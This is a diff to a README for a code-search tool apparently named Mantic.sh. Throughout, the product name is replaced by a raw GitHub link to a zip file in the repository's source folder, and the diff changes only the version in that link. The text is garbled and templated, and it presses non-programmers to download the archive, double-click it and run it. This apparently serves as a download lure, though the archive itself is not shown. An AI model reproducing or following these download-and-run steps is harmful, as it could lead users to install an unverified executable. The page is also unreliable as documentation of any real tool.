@@ -1,15 +1,15 @@
-# 🚀 https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip - Search Code Efficiently for AI Agents
+# 🚀 https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip - Search Code Efficiently for AI Agents
 
-[![Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip%https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip%20Here-brightgreen)](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip)
+[![Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip%https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip%20Here-brightgreen)](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip)
 
 ## 🔍 Overview
 
-https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip is a structural code search engine designed for AI agents. It helps you easily find specific pieces of code across various projects. With its quick search capabilities and user-friendly interface, you can streamline your development tasks and retrieve context intelligently.
+https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip is a structural code search engine designed for AI agents. It helps you easily find specific pieces of code across various projects. With its quick search capabilities and user-friendly interface, you can streamline your development tasks and retrieve context intelligently.
 
 ## 🎯 Features
 
 - **Fast Code Search:** Find what you need without wasting time.
-- **Context Retrieval:** https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip understands your code, allowing you to get relevant information quickly.
+- **Context Retrieval:** https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip understands your code, allowing you to get relevant information quickly.
 - **Multi-Project Support:** Search through multiple codebases effortlessly.
 - **User-Friendly Interface:** No programming experience is required.
 
@@ -23,13 +23,13 @@ Before you start, ensure that your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip**
+1. **Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip**
    
-   Visit the Releases page to get the latest version of https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip [Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip).
+   Visit the Releases page to get the latest version of https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip [Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip).
 
-   ![Layout Image](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip+Interface)
+   ![Layout Image](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip+Interface)
 
-2. **Install https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip**
+2. **Install https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip**
 
    After downloading, follow these steps:
 
@@ -37,19 +37,19 @@ Before you start, ensure that your system meets the following requirements:
    - Open the file by double-clicking it.
    - Follow the on-screen instructions to complete the installation.
 
-3. **Run https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip**
+3. **Run https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip**
 
-   Once installed, you can find https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip in your applications or programs list. Click on the icon to open the application.
+   Once installed, you can find https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip in your applications or programs list. Click on the icon to open the application.
 
 ## 📥 Download & Install
 
-To download the latest version of https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip, please visit: [Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip).
+To download the latest version of https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip, please visit: [Download https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip](https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip).
 
 Follow the steps outlined in the "Getting Started" section to install and run the application smoothly.
 
-## 🔧 How to Use https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip
+## 🔧 How to Use https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip
 
-Using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip is simple. Here’s how to get started with your first search:
+Using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip is simple. Here’s how to get started with your first search:
 
 1. Open the application.
 2. Enter your search query in the search bar.
@@ -58,7 +58,7 @@ Using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1
 
 ## 🛠️ Troubleshooting
 
-If you encounter issues while using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip, here are some common troubleshooting steps:
+If you encounter issues while using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip, here are some common troubleshooting steps:
 
 - **Installation Issues:** Make sure that you followed the installation steps correctly. Check if your system meets the requirements.
 - **Search Not Returning Results:** Ensure that your query is accurate. Try different keywords or phrases.
@@ -66,14 +66,14 @@ If you encounter issues while using https://github.com/theodags/Mantic.sh/raw/re
 
 ## ✅ Frequently Asked Questions
 
-**Q: Is any programming knowledge required to use https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip**  
-A: No, https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip is designed for anyone to use, regardless of their programming background.
+**Q: Is any programming knowledge required to use https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip**  
+A: No, https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip is designed for anyone to use, regardless of their programming background.
 
-**Q: Can I use https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip on different operating systems?**  
-A: Yes, https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip runs on Windows, macOS, and various Linux distributions.
+**Q: Can I use https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip on different operating systems?**  
+A: Yes, https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip runs on Windows, macOS, and various Linux distributions.
 
-**Q: How often is https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip updated?**  
-A: We strive to improve https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip regularly. Check the Releases page for the latest updates.
+**Q: How often is https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip updated?**  
+A: We strive to improve https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip regularly. Check the Releases page for the latest updates.
 
 ## 🔗 Related Topics
 
@@ -85,11 +85,11 @@ A: We strive to improve https://github.com/theodags/Mantic.sh/raw/refs/heads/mai
 
 ## 🤝 Contributing
 
-We welcome contributions to https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip If you have feedback or suggestions, feel free to open an issue on our GitHub repository. Collaboration helps us improve the application for everyone.
+We welcome contributions to https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip If you have feedback or suggestions, feel free to open an issue on our GitHub repository. Collaboration helps us improve the application for everyone.
 
 ## 📄 License
 
-https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip is open-source software. You can use it according to the terms of the MIT license.
+https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip is open-source software. You can use it according to the terms of the MIT license.
 
 For more information and to access the project's source code, please visit our repository.
 
@@ -97,4 +97,4 @@ For more information and to access the project's source code, please visit our r
 
 If you need help, you can reach out to our support team via GitHub Issues. We are here to assist you with any questions or difficulties you may have. 
 
-Thank you for using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v1.8-beta.2.zip!
+Thank you for using https://github.com/theodags/Mantic.sh/raw/refs/heads/main/src/Mantic-sh-v3.6.zip!
